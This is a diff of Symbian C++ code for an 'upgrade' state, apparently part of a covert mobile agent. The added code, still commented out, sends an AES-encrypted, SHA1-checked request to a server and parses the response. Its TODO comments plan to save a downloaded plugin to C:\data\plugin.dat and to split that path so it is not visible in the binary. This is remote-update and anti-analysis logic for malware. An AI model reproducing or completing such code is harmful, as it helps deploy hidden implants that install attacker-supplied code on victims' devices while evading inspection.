@@ -51,12 +51,44 @@ void CStateUpgrade::ActivateL(const TDesC8& aData)
 	// Parameter aData stores the K key
 	iSignKey.Copy(aData);
 	
-	//TODO: implement request
+	//TODO: uncomment request, at this moment the request is not sent, so upgrades are ignored
+	//TODO: remember to comment comment ProcessDataL() at the end of this method!
+	/*
+	TBuf8<32> plainBody(KProto_Upgrade);
+	_LIT8(KZero,"\x00\x00\x00\x00");
+	plainBody.Append(KZero);
+	// calculate SHA1
+	TBuf8<20> sha;
+	ShaUtils::CreateSha(plainBody,sha);
+	//append SHA1
+	plainBody.Append(sha);
+	//encrypt
+	RBuf8 buff(AES::EncryptPkcs5L(plainBody, KIV, iSignKey));
+	buff.CleanupClosePushL();
+	//add REST header
+	HBufC8* header = iObserver.GetRequestHeaderL();
+	TBuf8<32> contentLengthLine;
+	contentLengthLine.Append(KContentLength);
+	contentLengthLine.AppendNum(buff.Size());
+	contentLengthLine.Append(KNewLine);
+	iRequestData = HBufC8::NewL(header->Size()+contentLengthLine.Size()+KNewLine().Size()+buff.Size());
+	iRequestData->Des().Append(*header);
+	delete header;
+	iRequestData->Des().Append(contentLengthLine);
+	iRequestData->Des().Append(KNewLine);
+	iRequestData->Des().Append(buff);
+	CleanupStack::PopAndDestroy(&buff);
+		
+	iObserver.SendStateDataL(*iRequestData);
+	 */
+	
+	//TODO: when ready with upgrade, comment the following line 
 	ProcessDataL(KNullDesC8);
 	}
 
 void CStateUpgrade::ProcessDataL(const TDesC8& aData) 
 	{
+	// TODO: uncomment this part when ready with upgrade
 	/*
 	//free resources
 	delete iRequestData;
@@ -98,23 +130,18 @@ void CStateUpgrade::ProcessDataL(const TDesC8& aData)
 		iObserver.ResponseError(KErrSha);
 		return;
 		}
-		*/
-	/*
 	//check response
 	if(plainBody.Left(4).Compare(KProto_Ok) == 0)
 		{
-		FindFilesL(plainBody.Right(plainBody.Size()-8),iFilesArray);  //8=KProto_Ok|len
+		//TODO: create a method that saves upgrade as C:\data\plugin.dat
+		//TODO: combine strings c:\data\ and plugin.dat, so that the entire string
+		// is not evident into binaries
+		//SaveUpgradeL(plainBody.Right(plainBody.Size()-8),...); //8=KProto_Ok|len
+		//TODO: if everything ok, uncomment the following line when ready with upgrade
+		//iObserver.UpgradeAvailable();
 		}
 	CleanupStack::PopAndDestroy(&plainBody);
-	if(iFilesArray->Count()>0)
-		{
-		iFileIndex = 0;
-		iLongTask->NextRound();
-		}
-	else
-		iObserver.ChangeStateL();
-		*/
-	//TODO: implement process data
+	*/
 	iObserver.ChangeStateL(KErrNone);
 	}
 
